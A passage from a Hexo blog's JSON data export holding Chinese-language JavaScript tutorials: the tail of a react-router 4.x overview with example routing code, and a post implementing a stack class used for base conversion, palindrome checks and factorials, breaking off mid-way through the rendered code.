class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; BrowserRouter <span class=\"keyword\">as</span> Router, Route, Link &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-router-dom\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Index</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Home<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">About</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>About<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Users</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Users<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">AppRouter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Router&gt;</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">          &lt;ul&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/\"</span>&gt;Home&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/about/\"</span>&gt;About&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/users/\"</span>&gt;Users&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>nav&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/\"</span> exact component=&#123;Index&#125; /&gt;</span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/about/\"</span> component=&#123;About&#125; /&gt;</span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/users/\"</span> component=&#123;Users&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>Router&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> AppRouter;</span><br></pre></td></tr></table></figure>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><ul>\n<li><code>&lt;Router&gt;</code>：所有路由器组件的通用底层接口。通常情况下，应用程序会使用其中一种高级路由器:<code>&lt;BrowserRouter&gt;、&lt;HashRouter&gt;、&lt;MemoryRouter&gt;、&lt;NativeRouter&gt;、&lt;StaticRouter&gt;</code>。</li>\n<li><code>&lt;BrowserRouter&gt;</code>：使用HTML5 history API的路由实现。</li>\n<li><code>&lt;HashRouter&gt;</code>：使用URL的hash特性的路由实现。</li>\n<li><code>&lt;MemoryRouter&gt;</code>：<router>的一种实现，它将您的“URL”的历史记录保存在内存中(不读取或写入地址栏)。在测试和非浏览器环境(如React Native)中非常有用。</router></li>\n<li><code>&lt;StaticRouter&gt;</code>：<code>&lt;Router&gt;</code>的一种实现，一个从不改变位置的&lt;路由器&gt;，在服务器端和单元测试中很有用。</li>\n<li><code>&lt;Link&gt;</code>：提供声明性的、可访问的导航。</li>\n<li><code>&lt;NavLink&gt;</code>：特殊的<code>&lt;Link&gt;</code>，当它匹配当前URL时，将向呈现的元素添加样式属性。</li>\n<li><code>&lt;Redirect&gt;</code>：导航到一个新的位置，类别服务器端的重定向。</li>\n<li><code>&lt;Route&gt;</code>：核心组件，最基本的职责是在位置与路由路径匹配时呈现一些UI。</li>\n<li><code>&lt;Switch&gt;</code>：呈现与位置匹配的第一个子节点<code>&lt;Route&gt;</code>或<code>&lt;Redirect&gt;</code>。</li>\n<li><code>&lt;Prompt&gt;</code>：用于在离开页面之前提示用户。当您的应用程序进入一种应该防止用户导航离开的状态(就像表单只填写了一半)时，呈现一个<prompt>。</prompt></li>\n<li>history：待完善</li>\n<li>location：待完善</li>\n<li>match：待完善</li>\n<li>matchPath：待完善</li>\n<li>withRouter：待完善<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文是对react-router4.x的一个概览（web应用部分），不涉及具体编码细节，只作脉络梳理。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>React Router是一组导航组件，支持Web应用与React Native应用。对应的npm包为<code>react-router-dom</code>与<code>react-router-native</code>，两者都集成了核心包<code>react-router</code>。在web分支，最基本的三个组件是总容器组件<code>BrowserRouter</code>、占位组件<code>Route</code>和链接导航组件<code>Link</code>，总容器包裹整个需要导航的组件，一般包裹所有应用组件；占位组件定义了路由匹配规则及符合规则的组件渲染于此；链接导航组件的原型是a标签，定义了路由名称及对应句柄展示内容。</p>\n<h2 id=\"基本示例\"><a href=\"#基本示例\" class=\"headerlink\" title=\"基本示例\"></a>基本示例</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; BrowserRouter <span class=\"keyword\">as</span> Router, Route, Link &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-router-dom\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Index</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Home<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">About</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>About<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Users</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Users<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">AppRouter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Router&gt;</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">          &lt;ul&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/\"</span>&gt;Home&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/about/\"</span>&gt;About&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">            &lt;li&gt;</span><br><span class=\"line\">              &lt;Link to=<span class=\"string\">\"/users/\"</span>&gt;Users&lt;<span class=\"regexp\">/Link&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>li&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>nav&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/\"</span> exact component=&#123;Index&#125; /&gt;</span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/about/\"</span> component=&#123;About&#125; /&gt;</span><br><span class=\"line\">        &lt;Route path=<span class=\"string\">\"/users/\"</span> component=&#123;Users&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>Router&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> AppRouter;</span><br></pre></td></tr></table></figure>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><ul>\n<li><code>&lt;Router&gt;</code>：所有路由器组件的通用底层接口。通常情况下，应用程序会使用其中一种高级路由器:<code>&lt;BrowserRouter&gt;、&lt;HashRouter&gt;、&lt;MemoryRouter&gt;、&lt;NativeRouter&gt;、&lt;StaticRouter&gt;</code>。</li>\n<li><code>&lt;BrowserRouter&gt;</code>：使用HTML5 history API的路由实现。</li>\n<li><code>&lt;HashRouter&gt;</code>：使用URL的hash特性的路由实现。</li>\n<li><code>&lt;MemoryRouter&gt;</code>：<router>的一种实现，它将您的“URL”的历史记录保存在内存中(不读取或写入地址栏)。在测试和非浏览器环境(如React Native)中非常有用。</router></li>\n<li><code>&lt;StaticRouter&gt;</code>：<code>&lt;Router&gt;</code>的一种实现，一个从不改变位置的&lt;路由器&gt;，在服务器端和单元测试中很有用。</li>\n<li><code>&lt;Link&gt;</code>：提供声明性的、可访问的导航。</li>\n<li><code>&lt;NavLink&gt;</code>：特殊的<code>&lt;Link&gt;</code>，当它匹配当前URL时，将向呈现的元素添加样式属性。</li>\n<li><code>&lt;Redirect&gt;</code>：导航到一个新的位置，类别服务器端的重定向。</li>\n<li><code>&lt;Route&gt;</code>：核心组件，最基本的职责是在位置与路由路径匹配时呈现一些UI。</li>\n<li><code>&lt;Switch&gt;</code>：呈现与位置匹配的第一个子节点<code>&lt;Route&gt;</code>或<code>&lt;Redirect&gt;</code>。</li>\n<li><code>&lt;Prompt&gt;</code>：用于在离开页面之前提示用户。当您的应用程序进入一种应该防止用户导航离开的状态(就像表单只填写了一半)时，呈现一个<prompt>。</prompt></li>\n<li>history：待完善</li>\n<li>location：待完善</li>\n<li>match：待完善</li>\n<li>matchPath：待完善</li>\n<li>withRouter：待完善<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1></li>\n</ul>"},{"title":"数据结构与算法@栈","date":"2019-05-18T06:50:22.000Z","updated":"2019-05-18T06:50:22.000Z","_content":"\n# 概述\n\n栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。\n\n栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作（后\n面的章节讨论图和回溯问题时，我们会学习如何应用这个例子）。Java 和 C#用栈来存储变量和方\n法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常。\n\n最后将学习使用栈的三个最著名的算法示例。首先是十进制转二进制问题，以及任意进制转换的算法；\n然后是平衡圆括号问题；最后，我们会学习如何用栈解决汉诺塔问题。\n\n本篇主要讲如何用 JavaScript 描述实现一个栈类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 栈的实现\n\n```js\nclass Stack {\n  constructor() {\n    this.dataStore = [];\n    this.top = 0;\n  }\n  push(element) {\n    this.dataStore[this.top++] = element;\n  }\n  pop() {\n    return this.dataStore[--this.top];\n  }\n  peek() {\n    return this.dataStore[this.top - 1];\n  }\n  clear() {\n    this.top = 0;\n  }\n  length() {\n    return this.top;\n  }\n}\n\n// 测试\nlet s = new Stack();\ns.push(\"ali\");\ns.push(\"baidu\");\ns.push(\"tengxun\");\nconsole.log(s.length()); // 3\nlet poped = s.pop();\nconsole.log(poped); // tengxun\nconsole.log(s.length()); // 2\nlet peeked = s.peek();\nconsole.log(\"peeked: \" + peeked); // peeked: baidu\n```\n\n## 使用 Stack 类\n\n### 数制间的相互转换\n\n利用栈将一个数字从一种数值转换成另一种数制。\n\n```js\n// 十进制整数转成任何进制\nfunction mulBase(num, base) {\n  const DIGITS = \"0123456789ABCDEF\";\n  let s = new Stack();\n  do {\n    s.push(num % base);\n    num = Math.floor(num / base);\n  } while (num > 0);\n\n  let converted = \"\";\n  while (s.length() > 0) {\n    converted += DIGITS[s.pop()];\n  }\n  return converted;\n}\n\nconsole.log(mulBase(100345, 2)); // 11000011111111001\nconsole.log(mulBase(100345, 8)); // 303771\nconsole.log(mulBase(100345, 16)); // 187F9\nconsole.log(mulBase(5, 2)); // 101\n```\n\n## 回文判断\n\n回文是指这样一种现象：一个单词、短语或数字，从前往后写和从后往前写都是一样的。例如，“dad”、“racecar”、1001。\n\n```js\n// 判断给定字符串是否是回文\nfunction isPalindrome(word) {\n  let s = new Stack();\n  for (let i = 0; i < word.length; i++) {\n    s.push(word[i]);\n  }\n  let rword = \"\";\n  while (s.length() > 0) {\n    rword += s.pop();\n  }\n  return word === rword;\n}\n// 实现二\nfunction isPalindrome2(word) {\n  word = word + \"\";\n  return (\n    word ===\n    word\n      .split(\"\")\n      .reverse()\n      .join(\"\")\n  );\n}\n\nconsole.log(\"hello: \" + isPalindrome(\"hello\"));\nconsole.log(\"racecar: \" + isPalindrome(\"racecar\"));\nconsole.log(\"1001: \" + isPalindrome(1001));\n```\n\n## 递归演示\n\n下面是一个递归函数，可以计算任何数字的阶乘：\n\n```js\nfunction factorial(n) {\n  if (n === 0) {\n    return 1;\n  } else {\n    return n * factorial(n - 1);\n  }\n}\n\nfunction fact(n) {\n  let s = new Stack();\n  while (n > 1) {\n    s.push(n--);\n  }\n  let product = 1;\n  while (s.length() > 0) {\n    product *= s.pop();\n  }\n  return product;\n}\n\nconsole.log(\"factorial: \" + factorial(5));\nconsole.log(\"fact: \" + fact(5));\n// factorial: 120\n// fact: 120\n```\n\n## 意外收获\n\n1. 浮点数怎么转换成二进制，怎么转成任意进制？\n\n```\n小数部分计算方法：\n乘2取整法，即每一步将十进制小数部分乘以2，所得积的小数点左边的数字（0或1）作为二进制表示法中的数字，直到满足你的精确度为止。\n0.874的转换过程（取精度为6位）：\n0.874*2＝1.748 小数点左边为 1\n0.748*2＝1.496 小数点左边为 1\n0.496*2＝0.992 小数点左边为 0\n0.992*2＝1.984 小数点左边为 1\n0.984*2＝1.968 小数点左边为 1\n0.968*2＝1.936 小数点左边为 1\n十进制：123.874 二进制：1111011.110111\n```\n\n2. 回文古诗验证？\n3. 如下图：\n![思维导图](1.jpg)\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——栈（练习题及实现）](/2019/04/30/data-structures-stack-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","source":"_posts/2019/05/数据结构与算法-栈.md","raw":"---\ntitle: 数据结构与算法@栈\npermalink: 数据结构与算法@栈\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 14:50:22\nupdated: 2019-05-18 14:50:22\n---\n\n# 概述\n\n栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。\n\n栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作（后\n面的章节讨论图和回溯问题时，我们会学习如何应用这个例子）。Java 和 C#用栈来存储变量和方\n法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常。\n\n最后将学习使用栈的三个最著名的算法示例。首先是十进制转二进制问题，以及任意进制转换的算法；\n然后是平衡圆括号问题；最后，我们会学习如何用栈解决汉诺塔问题。\n\n本篇主要讲如何用 JavaScript 描述实现一个栈类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 栈的实现\n\n```js\nclass Stack {\n  constructor() {\n    this.dataStore = [];\n    this.top = 0;\n  }\n  push(element) {\n    this.dataStore[this.top++] = element;\n  }\n  pop() {\n    return this.dataStore[--this.top];\n  }\n  peek() {\n    return this.dataStore[this.top - 1];\n  }\n  clear() {\n    this.top = 0;\n  }\n  length() {\n    return this.top;\n  }\n}\n\n// 测试\nlet s = new Stack();\ns.push(\"ali\");\ns.push(\"baidu\");\ns.push(\"tengxun\");\nconsole.log(s.length()); // 3\nlet poped = s.pop();\nconsole.log(poped); // tengxun\nconsole.log(s.length()); // 2\nlet peeked = s.peek();\nconsole.log(\"peeked: \" + peeked); // peeked: baidu\n```\n\n## 使用 Stack 类\n\n### 数制间的相互转换\n\n利用栈将一个数字从一种数值转换成另一种数制。\n\n```js\n// 十进制整数转成任何进制\nfunction mulBase(num, base) {\n  const DIGITS = \"0123456789ABCDEF\";\n  let s = new Stack();\n  do {\n    s.push(num % base);\n    num = Math.floor(num / base);\n  } while (num > 0);\n\n  let converted = \"\";\n  while (s.length() > 0) {\n    converted += DIGITS[s.pop()];\n  }\n  return converted;\n}\n\nconsole.log(mulBase(100345, 2)); // 11000011111111001\nconsole.log(mulBase(100345, 8)); // 303771\nconsole.log(mulBase(100345, 16)); // 187F9\nconsole.log(mulBase(5, 2)); // 101\n```\n\n## 回文判断\n\n回文是指这样一种现象：一个单词、短语或数字，从前往后写和从后往前写都是一样的。例如，“dad”、“racecar”、1001。\n\n```js\n// 判断给定字符串是否是回文\nfunction isPalindrome(word) {\n  let s = new Stack();\n  for (let i = 0; i < word.length; i++) {\n    s.push(word[i]);\n  }\n  let rword = \"\";\n  while (s.length() > 0) {\n    rword += s.pop();\n  }\n  return word === rword;\n}\n// 实现二\nfunction isPalindrome2(word) {\n  word = word + \"\";\n  return (\n    word ===\n    word\n      .split(\"\")\n      .reverse()\n      .join(\"\")\n  );\n}\n\nconsole.log(\"hello: \" + isPalindrome(\"hello\"));\nconsole.log(\"racecar: \" + isPalindrome(\"racecar\"));\nconsole.log(\"1001: \" + isPalindrome(1001));\n```\n\n## 递归演示\n\n下面是一个递归函数，可以计算任何数字的阶乘：\n\n```js\nfunction factorial(n) {\n  if (n === 0) {\n    return 1;\n  } else {\n    return n * factorial(n - 1);\n  }\n}\n\nfunction fact(n) {\n  let s = new Stack();\n  while (n > 1) {\n    s.push(n--);\n  }\n  let product = 1;\n  while (s.length() > 0) {\n    product *= s.pop();\n  }\n  return product;\n}\n\nconsole.log(\"factorial: \" + factorial(5));\nconsole.log(\"fact: \" + fact(5));\n// factorial: 120\n// fact: 120\n```\n\n## 意外收获\n\n1. 浮点数怎么转换成二进制，怎么转成任意进制？\n\n```\n小数部分计算方法：\n乘2取整法，即每一步将十进制小数部分乘以2，所得积的小数点左边的数字（0或1）作为二进制表示法中的数字，直到满足你的精确度为止。\n0.874的转换过程（取精度为6位）：\n0.874*2＝1.748 小数点左边为 1\n0.748*2＝1.496 小数点左边为 1\n0.496*2＝0.992 小数点左边为 0\n0.992*2＝1.984 小数点左边为 1\n0.984*2＝1.968 小数点左边为 1\n0.968*2＝1.936 小数点左边为 1\n十进制：123.874 二进制：1111011.110111\n```\n\n2. 回文古诗验证？\n3. 如下图：\n![思维导图](1.jpg)\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——栈（练习题及实现）](/2019/04/30/data-structures-stack-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","slug":"数据结构与算法@栈","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d90v00afwovvwsgyvqcd","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。</p>\n<p>栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作（后<br>面的章节讨论图和回溯问题时，我们会学习如何应用这个例子）。Java 和 C#用栈来存储变量和方<br>法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常。</p>\n<p>最后将学习使用栈的三个最著名的算法示例。首先是十进制转二进制问题，以及任意进制转换的算法；<br>然后是平衡圆括号问题；最后，我们会学习如何用栈解决汉诺塔问题。</p>\n<p>本篇主要讲如何用 JavaScript 描述实现一个栈类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。<br><img src=\"/数据结构与算法@栈/0.svg\" alt=\"思维导图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"栈的实现\"><a href=\"#栈的实现\" class=\"headerlink\" title=\"栈的实现\"></a>栈的实现</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Stack</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.top = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  push(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.top++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  pop() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[--<span class=\"keyword\">this</span>.top];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  peek() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.top - <span class=\"number\">1</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.top = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  length() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.top;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">s.push(<span class=\"string\">\"ali\"</span>);</span><br><span class=\"line\">s.push(<span class=\"string\">\"baidu\"</span>);</span><br><span class=\"line\">s.push(<span class=\"string\">\"tengxun\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length()); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> poped = s.pop();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(poped); <span class=\"comment\">// tengxun</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length()); <span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> peeked = s.peek();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"peeked: \"</span> + peeked); <span class=\"comment\">// peeked: baidu</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用-Stack-类\"><a href=\"#使用-Stack-类\" class=\"headerlink\" title=\"使用 Stack 类\"></a>使用 Stack 类</h2><h3 id=\"数制间的相互转换\"><a href=\"#数制间的相互转换\" class=\"headerlink\" title=\"数制间的相互转换\"></a>数制间的相互转换</h3><p>利用栈将一个数字从一种数值转换成另一种数制。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 十进制整数转成任何进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mulBase</span>(<span class=\"params\">num, base</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> DIGITS = <span class=\"string\">\"0123456789ABCDEF\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> s = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">    s.push(num % base);</span><br><span class=\"line\">    num = <span class=\"built_in\">Math</span>.floor(num / base);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">while</span> (num &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> converted = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> 